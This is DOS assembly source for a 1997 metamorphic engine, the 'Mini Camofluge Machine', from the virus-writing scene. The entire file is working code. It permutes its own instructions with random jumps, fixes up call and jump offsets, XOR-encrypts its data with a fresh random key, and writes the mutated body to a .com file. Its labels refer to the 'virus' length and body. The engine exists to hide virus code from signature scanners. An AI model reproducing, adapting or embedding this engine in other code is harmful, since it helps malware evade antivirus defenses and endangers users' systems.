.model tiny
codeseg
.8086
org 100h
; Mini Camofluge Machine v 0.62
; (c) 1997 by Pashkovsky Maxim [PARAFFiN]
;-----------------------------C-O-D-E----------------------------------------
LengthVirus equ (EndVir-Start)*2
;***********************I*N*T*S**********************************************
start:
i00:                call   CryptData
i01:                call   InitRandom
i02:                call   Infect
i03:                mov    ax,4C00h
i04:                int    21h
;============================================================================
InitRandom proc near
i05:                push    es
i06:                mov     ax,0040h
i07:                mov     es,ax
i08:                mov     ax,es:[006ch]
i09:                mov     word ptr cs:[rseed],ax
i10:                pop     es
i11:                ret
InitRandom endp
;============================================================================
Random proc near    ; 16 bit Random number
i12:                push    cx
i13:                push    bx
i14:                mov     bx,word ptr cs:[rvalue]
i15:                mov     ax,word ptr cs:[rseed]
i16:                rol     ax,1
i17:                sub     ax,7
i18:                xor     ax,bx
i19:                mov     word ptr cs:[rvalue],ax
i20:                mov     word ptr cs:[rseed],bx
i21:                mul     dx              ;(input value) * (delta)
i22:                mov     cx,-1
i23:                cmp     dx,cx           ;verify divide will work
i24:                jae     @abort          ;jmp if divide will not work
i25:                div     cx              ;(input value) * (delta) / ffffh
i26:  @abort:       pop     bx
i27:                pop     cx
i28:                ret
Random endp
;============================================================================
VerifyAlloc proc near   ; Verify place.
i29:                push    ax
i30:                push    cx
i31:                mov     ax,word ptr cs:[AddrPTR]
i32:                mov     bx,offset AddrTab
i33:                sub     ax,bx
i34:                push    dx         ;<=¿
i35:                mov     cx,2AABh   ;  | divide ax by 6 = ax/6
i36:                mul     cx         ;  :
i37:                mov     cx,dx      ;  |
i38:                pop     dx         ;<=Ù
i39:  @vloop:       mov     ax,word ptr cs:[bx]
i40:                cmp     dx,ax
i41:                jb      @vnext
i42:                add     ax,word ptr cs:[bx+2]
i43:                cmp     dx,ax
i44:                jb      @verror
i45:  @vnext:       add     bx,6
i46:                loop    @vloop
i47:                clc
i48:                jmp     @vquit
i49:  @verror:      stc
i50:  @vquit:       pop     cx
i51:                pop     ax
i52:                ret
VerifyAlloc endp
;============================================================================
Jump proc near  ; Make near jump (E9h opcode) to free random place.
i53:                push    ax
i54:                mov     bx,word ptr cs:[AddrPTR]
i55:                mov     word ptr cs:[bx],di
i56:                mov     word ptr cs:[bx+2],3
i57:                mov     word ptr cs:[bx+4],0
i58:                add     word ptr cs:[AddrPTR],6
i59:                mov     al,0E9h
i60:                stosb
i61:  @jnew:        mov     dx,0FFFDh
i62:                call    Random
i63:                mov     dx,di
i64:                add     dx,2
i65:                add     dx,ax
i66:                cmp     dx,offset code + LengthVirus - 10
i67:                jae     @jnew
i68:                cmp     dx,offset code
i69:                jbe     @jnew
i70:                xor     cx,cx
i71:                mov     bx,word ptr cs:[LenghtPTR]
i72:                mov     cl,byte ptr cs:[bx]
i73:                add     cx,3
i74:  @jverify:    call    VerifyAlloc  ; Verify place.
i75:                jc      @jnew
i76:                inc     dx
i77:               loop    @jverify
i78:  @jend:        stosw
i79:                add     di,ax
i80:                pop     ax
i81:                ret
Jump endp
;============================================================================
JumpNear proc near  ;Proc for adjust near jump.
i82:               push    ax
i83:                mov     bx,word ptr cs:[AddrPTR]
i84:                mov     word ptr cs:[bx],di ; Build table for near jumps.
i85:                mov     word ptr cs:[bx+2],2
i86:                mov     word ptr cs:[bx+4],si
i87:                add     word ptr cs:[AddrPTR],6
i88:                movsb
i89:  @jnnew:       xor     ax,ax
i90:                mov     dx,0FDh
i91:                call    Random
i92:                cmp     al,20
i93:                jb      @jnnew
i94:                cbw
i95:                mov     dx,di
i96:                inc     dx
i97:                add     dx,ax
i98:                cmp     dx,offset code + LengthVirus - 10
i99:                jae     @jnnew
i100:               cmp     dx,offset code
i101:               jbe     @jnnew
i102:               mov     cx,3
i103:  @jnverify:  call    VerifyAlloc  ; Verify place.
i104:               jc      @jnnew
i105:               inc     dx
i106:              loop    @jnverify
i107:               stosb
i108:               push    di
i109:               add     di,ax
i110:               mov     bx,word ptr cs:[AddrPTR]
i111:               mov     word ptr cs:[bx],di
i112:               mov     word ptr cs:[bx+2],3
i113:               mov     word ptr cs:[bx+4],0
i114:               add     word ptr cs:[AddrPTR],6
i115:               mov     al,0E9h
i116:               stosb
i117:               lodsb
i118:               cbw
i119:               push    si
i120:               add     si,ax
i121:               lodsb
i122:               cmp     al,0E9h
i123:               jne     @jnnext
i124:               lodsw
i125:               add     si,ax
i126:               inc     si
i127:  @jnnext:     dec     si
i128:               mov     bx,word ptr cs:[JumpPTR]  ;Near jump table.
i129:               mov     word ptr cs:[bx],si
i130:               mov     word ptr cs:[bx+2],di
i131:               add     word ptr cs:[JumpPTR],4
i132:               pop     si
i133:               pop     di
i134:               pop     ax
i135:               ret
JumpNear endp
;============================================================================
CallNear proc near  ;Build addr table for near call.
i136:               mov     bx,word ptr cs:[JumpPTR]
i137:               mov     cx,si
i138:               add     cx,3       ;inc     cx
i139:               add     cx,word ptr cs:[si+1]
i140:               mov     word ptr cs:[bx],cx
i141:               mov     word ptr cs:[bx+2],di
i142:               inc     word ptr cs:[bx+2]
i143:               add     word ptr cs:[JumpPTR],4
i144:               ret
CallNear endp
;============================================================================
MoveInst proc near  ;Move instruction on new place.
i145:               cmp     si,word ptr cs:[CryptMov]  ; Verify CryptValue
i146:               jne     @NoValue
i147:               mov     word ptr cs:[OldCryptMov],si
i148:               mov     word ptr cs:[CryptMov],di
i149:               jmp     @NoCrypt
i150:  @NoValue:    cmp     si,word ptr cs:[CryptChg] ; Verify ChangeCrypt
i151:               jne     @NoCrypt
i152:               mov     word ptr cs:[OldCryptChg],si
i153:               mov     word ptr cs:[CryptChg],di
i154:  @NoCrypt:    mov     bx,word ptr cs:[LenghtPTR] ;====================
i155:               xor     cx,cx
i156:               mov     cl,byte ptr cs:[bx]
i157:               mov     bx,word ptr cs:[AddrPTR]
i158:               mov     word ptr cs:[bx],di       ;Build table for instr.
i159:               mov     word ptr cs:[bx+2],cx
i160:               mov     word ptr cs:[bx+4],si
i161:               add     word ptr cs:[AddrPTR],6
i162:               rep movsb
i163:               ret
MoveInst endp
;============================================================================
Mutation proc near  ;Main loop of mutation.
i164:               mov     si,offset start  ; SI have OLD! code offset.
i165:               mov     di,offset code   ; DI have NEW! code offset.
i166:               mov     ax,offset EndData-offset LenghtTab-1
i167:               cld
i168:  @m1:         cmp     byte ptr cs:[si],70h   ;<=¿
i169:               jb      @m2                    ;  | jumps.
i170:               cmp     byte ptr cs:[si],7Fh   ;<=Ù
i171:               jbe     @realloc
i172:  @m2:         cmp     byte ptr cs:[si],0E0h
i173:               jb      @m3
i174:               cmp     byte ptr cs:[si],0E3h
i175:               jbe     @realloc
i176:  @m3:         cmp     byte ptr cs:[si],0EBh  ; short jump.
i177:               je      @realloc
i178:               cmp     byte ptr cs:[si],0E8h  ; near call.
i179:               jne     @m4
i180:               call    CallNear
i181:  @m4:         cmp     byte ptr cs:[si],0E9h  ; NEAR JUMP !!!
i182:               jne     @mend
i183:               mov     bx,word ptr cs:[si+1]
i184:               add     si,3
i185:               add     si,bx
i186:               jmp     @m1
i187:  @realloc:    call    JumpNear
i188:               jmp     @mnext
i189:  @mend:       call    MoveInst
i190:  @mnext:      inc     word ptr cs:[LenghtPTR]
i191:               mov     dx,di
i192:               mov     cx,3
i193:               mov     bx,word ptr cs:[LenghtPTR]
i194:               add     cl,byte ptr cs:[bx]
i195:  @mjverify:  call    VerifyAlloc   ; Verify place.
i196:               jc      @mjump
i197:               inc     dx
i198:              loop    @mjverify
i199:               cmp     dx,offset code + LengthVirus - 10
i200:               jae     @mjump
i201:               push    ax
i202:               mov     dx,3h
i203:               call    Random
i204:               cmp     al,1h
i205:               pop     ax
i206:               jne     @loop
i207:  @mjump:      call    Jump
i208:  @loop:       dec     ax
i209:               jnz     @m1 ;============================================
i210:               mov     dx,word ptr cs:[JumpPTR]  ; Adjust address.
i211:               mov     bx,offset JumpTab
i212:               sub     dx,bx
i213:               shr     dx,1                   ; div 4
i214:               shr     dx,1                   ; <=Ù
i215:   @mreall:    mov     di,offset AddrTab
i216:               mov     ax,word ptr cs:[bx]
i217:               mov     cx,word ptr cs:[AddrPTR]
i218:               sub     cx,di
i219:               shr     cx,1
i220:               repnz   scasw
i221:               jcxz    @merror
i222:               mov     ax,word ptr cs:[di-6]
i223:               mov     di,word ptr cs:[bx+2]
i224:               sub     ax,di
i225:               sub     ax,2
i226:               stosw
i227:  @merror:     add     bx,4
i228:               dec     dx
i229:               jnz     @mreall ;========================================
i230:               mov     word ptr cs:[LenghtPTR],offset LenghtTab
i231:               mov     word ptr cs:[AddrPTR],offset AddrTab
i232:               mov     word ptr cs:[JumpPTR],offset JumpTab
i233:               mov     dx,0FFFFh     ; Adjust CryptValue.
i234:               call    Random
i235:               mov     bx,word ptr cs:[CryptMov]
i236:               mov     [bx+1],ax
i237:               sub     word ptr cs:[CryptMov],offset Code-100h
i238:               mov     bx,word ptr cs:[OldCryptMov]
i239:               mov     [bx+1],ax   ;<===========================
i240:               mov     dx,0FFFFh     ; Adjust ChangeValue.
i241:               call    Random
i242:               mov     bx,word ptr cs:[CryptChg]
i243:               mov     [bx+2],ax
i244:               sub     word ptr cs:[CryptChg],offset Code-100h
i245:               mov     bx,word ptr cs:[OldCryptChg]
i246:               mov     [bx+2],ax   ;<===========================
i247:               call    CryptData   ; Crypt.
i248:               mov     si,offset Data    ; Move data.
i249:               mov     di,offset AddrTab ; NewData;
i250:               mov     cx,EndData-Data
i251:               rep movsb
i252:               ret
Mutation endp
;============================================================================
Infect proc near
i253:               call    Message
i254:               mov     dx,offset FileName           ;Open File
i255:               mov     ah,3ch
i256:               xor     cx,cx
i257:               int     21h
i258:               mov     word ptr cs:[FileHandle],ax
i259:               call    Mutation
i260:               mov     bx,word ptr cs:[FileHandle]  ;Write Virus body
i261:               mov     cx,offset EndData - 100h     ;offset JumpTab + 512 - 100h
i262:               mov     dx,offset Code
i263:               mov     ah,40h
i264:               int     21h
i265:               mov     bx,word ptr cs:[FileHandle]   ;Close file
i266:               mov     ah,3Eh
i267:               int     21h
i268:               ret
Infect endp
;============================================================================
Message proc near
i269:               mov     dx,offset Copyright
i270:               mov     ah,09h
i271:               int     21h
i272:               ret
Message endp
;============================================================================
CryptData proc near ; Crypt data body.
i273:               mov    cx,(EndData-Data)/2+1
i274:               mov    si,offset Data
i275:               push   si
i276:               pop    di
i277:  CryptValue   db 0BAh,?,?      ;mov    dx,??h
i278:  @DeCrypt:    lodsw
i279:               xor    ax,dx
i280:               stosw
i281:  ChangeValue  db 81h,0C2h,?,?      ;add    dx,??h
i282:               loop   @DeCrypt
i283:               ret
i284:
CryptData endp
;============================================================================
EndVir:
org LengthVirus+100h ;$+300h
;---------------------------------D-A-T-A------------------------------------
Data:
Copyright db '[MCMv0.62(c)Jul1997byPARAFFiN]','$'
FileName db 'test_mcm.com',0
LenghtPTR dw offset LenghtTab
AddrPTR   dw offset AddrTab
JumpPTR   dw offset JumpTab
CryptMov  dw offset CryptValue
CryptChg  dw offset ChangeValue
LenghtTab:  ; Instruction lenght table.
db i01-i00,i02-i01,i03-i02,i04-i03,i05-i04,i06-i05,i07-i06,i08-i07,i09-i08,i10-i09
db i11-i10,i12-i11,i13-i12,i14-i13,i15-i14,i16-i15,i17-i16,i18-i17,i19-i18,i20-i19
db i21-i20,i22-i21,i23-i22,i24-i23,i25-i24,i26-i25,i27-i26,i28-i27,i29-i28,i30-i29
db i31-i30,i32-i31,i33-i32,i34-i33,i35-i34,i36-i35,i37-i36,i38-i37,i39-i38,i40-i39
db i41-i40,i42-i41,i43-i42,i44-i43,i45-i44,i46-i45,i47-i46,i48-i47,i49-i48,i50-i49
db i51-i50,i52-i51,i53-i52,i54-i53,i55-i54,i56-i55,i57-i56,i58-i57,i59-i58,i60-i59
db i61-i60,i62-i61,i63-i62,i64-i63,i65-i64,i66-i65,i67-i66,i68-i67,i69-i68,i70-i69
db i71-i70,i72-i71,i73-i72,i74-i73,i75-i74,i76-i75,i77-i76,i78-i77,i79-i78,i80-i79
db i81-i80,i82-i81,i83-i82,i84-i83,i85-i84,i86-i85,i87-i86,i88-i87,i89-i88,i90-i89
db i91-i90,i92-i91,i93-i92,i94-i93,i95-i94,i96-i95,i97-i96,i98-i97,i99-i98,i100-i99
db i101-i100,i102-i101,i103-i102,i104-i103,i105-i104,i106-i105,i107-i106,i108-i107,i109-i108,i110-i109
db i111-i110,i112-i111,i113-i112,i114-i113,i115-i114,i116-i115,i117-i116,i118-i117,i119-i118,i120-i119
db i121-i120,i122-i121,i123-i122,i124-i123,i125-i124,i126-i125,i127-i126,i128-i127,i129-i128,i130-i129
db i131-i130,i132-i131,i133-i132,i134-i133,i135-i134,i136-i135,i137-i136,i138-i137,i139-i138,i140-i139
db i141-i140,i142-i141,i143-i142,i144-i143,i145-i144,i146-i145,i147-i146,i148-i147,i149-i148,i150-i149
db i151-i150,i152-i151,i153-i152,i154-i153,i155-i154,i156-i155,i157-i156,i158-i157,i159-i158,i160-i159
db i161-i160,i162-i161,i163-i162,i164-i163,i165-i164,i166-i165,i167-i166,i168-i167,i169-i168,i170-i169
db i171-i170,i172-i171,i173-i172,i174-i173,i175-i174,i176-i175,i177-i176,i178-i177,i179-i178,i180-i179
db i181-i180,i182-i181,i183-i182,i184-i183,i185-i184,i186-i185,i187-i186,i188-i187,i189-i188,i190-i189
db i191-i190,i192-i191,i193-i192,i194-i193,i195-i194,i196-i195,i197-i196,i198-i197,i199-i198,i200-i199
db i201-i200,i202-i201,i203-i202,i204-i203,i205-i204,i206-i205,i207-i206,i208-i207,i209-i208,i210-i209
db i211-i210,i212-i211,i213-i212,i214-i213,i215-i214,i216-i215,i217-i216,i218-i217,i219-i218,i220-i219
db i221-i220,i222-i221,i223-i222,i224-i223,i225-i224,i226-i225,i227-i226,i228-i227,i229-i228,i230-i229
db i231-i230,i232-i231,i233-i232,i234-i233,i235-i234,i236-i235,i237-i236,i238-i237,i239-i238,i240-i239
db i241-i240,i242-i241,i243-i242,i244-i243,i245-i244,i246-i245,i247-i246,i248-i247,i249-i248,i250-i249
db i251-i250,i252-i251,i253-i252,i254-i253,i255-i254,i256-i255,i257-i256,i258-i257,i259-i258,i260-i259
db i261-i260,i262-i261,i263-i262,i264-i263,i265-i264,i266-i265,i267-i266,i268-i267,i269-i268,i270-i269
db i271-i270,i272-i271,i273-i272,i274-i273,i275-i274,i276-i275,i277-i276,i278-i277,i279-i278,i280-i279
db i281-i280,i282-i281,i283-i282,i284-i283,0;i285-i284,i286-i285,i287-i286,i288-i287,i289-i288,i290-i289
;db i291-i290,i292-i291,i293-i292,i294-i293,i295-i294,i296-i295,i297-i296,i298-i297,i299-i298,i300-i299
;db i301-i300,i302-i301,i303-i302,i304-i303,i305-i304,i306-i305,i307-i306,i308-i307,i309-i308,i310-i309
EndData:
; Official data.
RSeed dw ?
RValue dw ?
FileHandle dw ?
OldCryptMov dw ?
OldCryptChg dw ?
Code db LengthVirus dup(?)
AddrTab db 0B00h dup(?)
JumpTab db 300h dup(?)
end start
